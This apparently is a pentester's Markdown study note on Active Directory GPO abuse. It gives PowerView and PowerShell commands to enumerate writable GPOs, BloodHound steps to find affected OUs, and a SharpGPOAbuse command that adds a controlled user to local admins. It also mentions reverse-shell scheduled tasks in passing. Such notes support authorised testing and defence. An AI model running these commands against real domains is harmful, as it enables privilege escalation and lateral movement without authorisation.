---
title: AD GPO Abuse
draft: false
tags:
  - windows
  - active-directory
  - post-exploitation
  - lateral-movement
  - privesc
  - persistence
---
 
GPO attacks:
- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

# Enumeration

- Using PowerView:
```powershell
PS C:\> Get-DomainGPO |select displayname # enumerate GPO names
PS C:\> Get-GPO -All | Select DisplayName # enumerate GPO names using LOTL

# check if the entire Domain Users group has rights over any GPO (we can also specify the SID of any user we control to check the GPOs we have rights on)
PS C:\> $sid=Convert-NameToSid "Domain Users"
PS C:\> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# check the display name of the GPO:
PS C:\ Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

> [!Note]
> `WriteProperty` and `WriteDacl` GPOs can give us full control over the GPO. This means we can perform any attack on the users and computers in the OUs where the GPO is applied.

- Using BloodHound:
```
1. Select the GPO we are interested in (use PowerView enumeration to check GPOs we have rights on, whether its for a user we have control or the Domain Users group)
2. Go to Node Info tab
3. Select Affected Objects (this will output the OUs where the GPO is applied and the affected computers/users that belong to the OUs)
```

# Abuse
We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.

> [!Example]
> Add a user to the Local Admins group leveraging a GPO we have control over (GenericWrite/WriteOwner/WriteDACL)
> ```
> PS C:\> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount AD_USER --GPOName "Default Domain Policy"
> ```

> [!Note]
> We might need to close and reopen the session to check visible changes or run:
> `PS C:\> gpupdate /force`

Download from here: https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0